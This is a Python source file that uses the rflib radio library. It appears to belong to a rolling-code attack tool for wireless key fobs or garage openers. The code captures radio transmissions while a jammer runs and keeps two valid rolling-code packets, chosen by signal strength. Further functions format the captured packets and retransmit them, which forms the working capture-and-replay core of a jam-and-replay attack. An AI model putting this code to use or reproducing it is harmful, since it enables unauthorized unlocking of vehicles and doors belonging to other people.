from rflib import *
import bitstring
import time


#-----------------Start RF Capture ----------------#
def capturePayload(d, rolling_code, rf_settings):
    '''Starts a listener and returns a RFrecv capture of your choice and signal strength
    If there is rolling code options sent it will check for valid packets while jammer is running'''


    capture = ""        #Capture without Rolling code
    roll_captures = []  #List of captures for RollingCode

    roll_count = 0      #used to count 2 captures
    while True:
        try:
            y, z = d.RFrecv()
            capture = y.encode('hex')
            signal_strength= 0 - ord(str(d.getRSSI()))
        except ChipconUsbTimeoutException:
            pass

        #This block is used for rolling code things
        if rolling_code and capture:           #If there is a good capture and we are attacking rollingCode execute this block
            print "SIGNAL STRENGTH: " + str(signal_strength)
            print "RF CAPTURE: \n" + capture +"\n"
            decision = determineRealTransmission(signal_strength, rf_settings)
            if decision:
                roll_captures.append(capture)  #add key with good decision to the list
                if roll_count >= 1:            #Check if we have 2 keys and return.
                    return roll_captures, signal_strength
                else:
                    roll_count +=1
                    continue
            else:
                continue

        #This block is when just capturing and returning, no rolling code
        elif capture and not rolling_code:
            print "SIGNAL STRENGTH: " + str(signal_strength)
            print "RF CAPTURE: \n" + capture +"\n"

            response = raw_input( "\"Do you want to return the above payload? (y/n)")
            if response.lower() == 'y':
                break
            if response.lower() == 'n':
                capture =""

    return capture, signal_strength


#----------------- Deternmine Real Transmission ----------------#
def determineRealTransmission(signal_strength, rf_settings):
    if signal_strength > rf_settings.upper_rssi and signal_strength < rf_settings.lower_rssi:
        return True


#------------Split Captures by 4 or more 0's --------------------#
def splitCaptureByZeros(capture):
    '''Parse Hex from the capture by reducing 0's '''

    payloads = re.split('0000*', capture)
    items = []
    for payload in payloads:

        if len(payload) > 5:
            items.append(payload)

    return items


#------------ Hex conversion function --------------------#
def printFormatedHex(payload):
    ''' Helper function that takes RFRecv output and returns format hex
    Note dont just use this output into your send, but you can manually paste its output in a string'''

    formatedPayload = ""
    if (len(payload) % 2 == 0):
        print "The following payload is currently being formated: " + payload
        iterator = iter(payload)
        for i in iterator:
            formatedPayload += ('\\x'+i + next(iterator))

    return formatedPayload


#------------Create Payloads in Bytes--------------------#
def createBytesFromPayloads(payloads):
    '''Accepts a list of payloads for formating and returns a list formated in byte format
       For RFXmit transmission'''

    formatedPayloads = []
    for payload in payloads:

        #print "Converting payload to binary "
        binary = bin(int(payload,16))[2:]
        #print "Converting binary to bytes:"
        formatedPayloads.append(bitstring.BitArray(bin=(binary)).tobytes())

    return formatedPayloads


#------------Send Transmission--------------------#
def sendTransmission(payload, d):
    ''' Expects formated data for sending with RFXMIT'''
    print "Sending payload... "
    d.RFxmit(payload,10)
    print 'Transmission Complete'
